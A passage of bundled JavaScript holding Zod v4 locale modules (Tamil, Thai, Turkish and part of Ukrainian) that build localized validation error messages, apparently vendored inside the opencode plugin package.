    string: { unit: "\u0B8E\u0BB4\u0BC1\u0BA4\u0BCD\u0BA4\u0BC1\u0B95\u0BCD\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    file: { unit: "\u0BAA\u0BC8\u0B9F\u0BCD\u0B9F\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    array: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    set: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u0B8E\u0BA3\u0BCD \u0B85\u0BB2\u0BCD\u0BB2\u0BBE\u0BA4\u0BA4\u0BC1" : "\u0B8E\u0BA3\u0BCD";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0B85\u0BA3\u0BBF";
        }
        if (data === null) {
          return "\u0BB5\u0BC6\u0BB1\u0BC1\u0BAE\u0BC8";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1",
    email: "\u0BAE\u0BBF\u0BA9\u0BCD\u0BA9\u0B9E\u0BCD\u0B9A\u0BB2\u0BCD \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0BA4\u0BC7\u0BA4\u0BBF \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    date: "ISO \u0BA4\u0BC7\u0BA4\u0BBF",
    time: "ISO \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    duration: "ISO \u0B95\u0BBE\u0BB2 \u0B85\u0BB3\u0BB5\u0BC1",
    ipv4: "IPv4 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    ipv6: "IPv6 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    cidrv4: "IPv4 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    cidrv6: "IPv6 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    base64: "base64-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    base64url: "base64url-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    json_string: "JSON \u0B9A\u0BB0\u0BAE\u0BCD",
    e164: "E.164 \u0B8E\u0BA3\u0BCD",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.expected}, \u0BAA\u0BC6\u0BB1\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0BB0\u0BC1\u0BAA\u0BCD\u0BAA\u0BAE\u0BCD: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${joinValues2(issue3.values, "|")} \u0B87\u0BB2\u0BCD \u0B92\u0BA9\u0BCD\u0BB1\u0BC1`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD"} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue3.maximum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin} ${adj}${issue3.minimum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.prefix}" \u0B87\u0BB2\u0BCD \u0BA4\u0BCA\u0B9F\u0B99\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "ends_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.suffix}" \u0B87\u0BB2\u0BCD \u0BAE\u0BC1\u0B9F\u0BBF\u0BB5\u0B9F\u0BC8\u0BAF \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "includes")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.includes}" \u0B90 \u0B89\u0BB3\u0BCD\u0BB3\u0B9F\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "regex")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: ${_issue.pattern} \u0BAE\u0BC1\u0BB1\u0BC8\u0BAA\u0BBE\u0B9F\u0BCD\u0B9F\u0BC1\u0B9F\u0BA9\u0BCD \u0BAA\u0BCA\u0BB0\u0BC1\u0BA8\u0BCD\u0BA4 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B8E\u0BA3\u0BCD: ${issue3.divisor} \u0B87\u0BA9\u0BCD \u0BAA\u0BB2\u0BAE\u0BBE\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      case "unrecognized_keys":
        return `\u0B85\u0B9F\u0BC8\u0BAF\u0BBE\u0BB3\u0BAE\u0BCD \u0BA4\u0BC6\u0BB0\u0BBF\u0BAF\u0BBE\u0BA4 \u0BB5\u0BBF\u0B9A\u0BC8${issue3.keys.length > 1 ? "\u0B95\u0BB3\u0BCD" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0B9A\u0BC8`;
      case "invalid_union":
        return "\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1";
      case "invalid_element":
        return `${issue3.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1`;
      default:
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1`;
    }
  };
};
function ta_default2() {
  return {
    localeError: error83()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/th.js
var error84 = () => {
  const Sizable = {
    string: { unit: "\u0E15\u0E31\u0E27\u0E2D\u0E31\u0E01\u0E29\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    file: { unit: "\u0E44\u0E1A\u0E15\u0E4C", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    array: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    set: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u0E44\u0E21\u0E48\u0E43\u0E0A\u0E48\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02 (NaN)" : "\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0E2D\u0E32\u0E23\u0E4C\u0E40\u0E23\u0E22\u0E4C (Array)";
        }
        if (data === null) {
          return "\u0E44\u0E21\u0E48\u0E21\u0E35\u0E04\u0E48\u0E32 (null)";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19",
    email: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48\u0E2D\u0E35\u0E40\u0E21\u0E25",
    url: "URL",
    emoji: "\u0E2D\u0E34\u0E42\u0E21\u0E08\u0E34",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    date: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E41\u0E1A\u0E1A ISO",
    time: "\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    duration: "\u0E0A\u0E48\u0E27\u0E07\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    ipv4: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv4",
    ipv6: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv6",
    cidrv4: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv4",
    cidrv6: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv6",
    base64: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64",
    base64url: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64 \u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A URL",
    json_string: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A JSON",
    e164: "\u0E40\u0E1A\u0E2D\u0E23\u0E4C\u0E42\u0E17\u0E23\u0E28\u0E31\u0E1E\u0E17\u0E4C\u0E23\u0E30\u0E2B\u0E27\u0E48\u0E32\u0E07\u0E1B\u0E23\u0E30\u0E40\u0E17\u0E28 (E.164)",
    jwt: "\u0E42\u0E17\u0E40\u0E04\u0E19 JWT",
    template_literal: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0E1B\u0E23\u0E30\u0E40\u0E20\u0E17\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${issue3.expected} \u0E41\u0E15\u0E48\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0E04\u0E48\u0E32\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E37\u0E2D\u0E01\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19\u0E2B\u0E19\u0E36\u0E48\u0E07\u0E43\u0E19 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "\u0E44\u0E21\u0E48\u0E40\u0E01\u0E34\u0E19" : "\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23"}`;
        return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\u0E2D\u0E22\u0E48\u0E32\u0E07\u0E19\u0E49\u0E2D\u0E22" : "\u0E21\u0E32\u0E01\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E02\u0E36\u0E49\u0E19\u0E15\u0E49\u0E19\u0E14\u0E49\u0E27\u0E22 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E25\u0E07\u0E17\u0E49\u0E32\u0E22\u0E14\u0E49\u0E27\u0E22 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E21\u0E35 "${_issue.includes}" \u0E2D\u0E22\u0E39\u0E48\u0E43\u0E19\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21`;
        if (_issue.format === "regex")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14 ${_issue.pattern}`;
        return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E40\u0E1B\u0E47\u0E19\u0E08\u0E33\u0E19\u0E27\u0E19\u0E17\u0E35\u0E48\u0E2B\u0E32\u0E23\u0E14\u0E49\u0E27\u0E22 ${issue3.divisor} \u0E44\u0E14\u0E49\u0E25\u0E07\u0E15\u0E31\u0E27`;
      case "unrecognized_keys":
        return `\u0E1E\u0E1A\u0E04\u0E35\u0E22\u0E4C\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E23\u0E39\u0E49\u0E08\u0E31\u0E01: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u0E04\u0E35\u0E22\u0E4C\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue3.origin}`;
      case "invalid_union":
        return "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E44\u0E21\u0E48\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E22\u0E39\u0E40\u0E19\u0E35\u0E22\u0E19\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14\u0E44\u0E27\u0E49";
      case "invalid_element":
        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue3.origin}`;
      default:
        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07`;
    }
  };
};
function th_default2() {
  return {
    localeError: error84()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/tr.js
var parsedType7 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "number";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error85 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "olmal\u0131" },
    file: { unit: "bayt", verb: "olmal\u0131" },
    array: { unit: "\xF6\u011Fe", verb: "olmal\u0131" },
    set: { unit: "\xF6\u011Fe", verb: "olmal\u0131" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "girdi",
    email: "e-posta adresi",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO tarih ve saat",
    date: "ISO tarih",
    time: "ISO saat",
    duration: "ISO s\xFCre",
    ipv4: "IPv4 adresi",
    ipv6: "IPv6 adresi",
    cidrv4: "IPv4 aral\u0131\u011F\u0131",
    cidrv6: "IPv6 aral\u0131\u011F\u0131",
    base64: "base64 ile \u015Fifrelenmi\u015F metin",
    base64url: "base64url ile \u015Fifrelenmi\u015F metin",
    json_string: "JSON dizesi",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "\u015Eablon dizesi"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ge\xE7ersiz de\u011Fer: beklenen ${issue3.expected}, al\u0131nan ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ge\xE7ersiz de\u011Fer: beklenen ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ge\xE7ersiz se\xE7enek: a\u015Fa\u011F\u0131dakilerden biri olmal\u0131: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ok b\xFCy\xFCk: beklenen ${issue3.origin ?? "de\u011Fer"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\xF6\u011Fe"}`;
        return `\xC7ok b\xFCy\xFCk: beklenen ${issue3.origin ?? "de\u011Fer"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ge\xE7ersiz metin: "${_issue.prefix}" ile ba\u015Flamal\u0131`;
        if (_issue.format === "ends_with")
          return `Ge\xE7ersiz metin: "${_issue.suffix}" ile bitmeli`;
        if (_issue.format === "includes")
          return `Ge\xE7ersiz metin: "${_issue.includes}" i\xE7ermeli`;
        if (_issue.format === "regex")
          return `Ge\xE7ersiz metin: ${_issue.pattern} desenine uymal\u0131`;
        return `Ge\xE7ersiz ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ge\xE7ersiz say\u0131: ${issue3.divisor} ile tam b\xF6l\xFCnebilmeli`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar${issue3.keys.length > 1 ? "lar" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} i\xE7inde ge\xE7ersiz anahtar`;
      case "invalid_union":
        return "Ge\xE7ersiz de\u011Fer";
      case "invalid_element":
        return `${issue3.origin} i\xE7inde ge\xE7ersiz de\u011Fer`;
      default:
        return `Ge\xE7ersiz de\u011Fer`;
    }
  };
};
function tr_default2() {
  return {
    localeError: error85()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/uk.js
var error86 = () => {
  const Sizable = {
    string: { unit: "\u0441\u0438\u043C\u0432\u043E\u043B\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    file: { unit: "\u0431\u0430\u0439\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    array: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    set: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0447\u0438\u0441\u043B\u043E";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043C\u0430\u0441\u0438\u0432";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u0435\u043B\u0435\u043A\u0442\u0440\u043E\u043D\u043D\u043E\u0457 \u043F\u043E\u0448\u0442\u0438",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0434\u0430\u0442\u0430 \u0442\u0430 \u0447\u0430\u0441 ISO",
    date: "\u0434\u0430\u0442\u0430 ISO",
    time: "\u0447\u0430\u0441 ISO",
    duration: "\u0442\u0440\u0438\u0432\u0430\u043B\u0456\u0441\u0442\u044C ISO",
    ipv4: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv4",
    ipv6: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv6",
    cidrv4: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv4",
    cidrv6: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv6",
